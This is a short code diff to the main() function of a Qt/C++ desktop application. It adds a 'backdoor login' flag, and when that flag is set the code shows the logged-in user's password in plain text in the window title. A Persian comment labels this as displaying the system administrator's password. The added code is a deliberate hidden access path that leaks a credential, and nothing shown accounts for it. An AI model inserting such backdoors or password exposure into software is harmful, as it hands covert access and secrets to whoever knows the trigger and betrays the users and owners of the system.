@@ -103,12 +103,18 @@ int main(int argc, char *argv[])
     }
 
     //...
+    appInfo.isBackdoorLogin = false;
 
     LoginDialog *loginDialog = new LoginDialog();
     if ( loginDialog->exec() == QDialog::Accepted )
     {
         MainWindow *w = new MainWindow();
         w->show();
+
+        // نمایش کلمه عبور مدیر سیستم
+        if (appInfo.isBackdoorLogin)
+            w->setWindowTitle( "Pass  = $" +  userInfo.password + "$");
+
     } else {
         appInfo.db.close();
         qApp->quit();
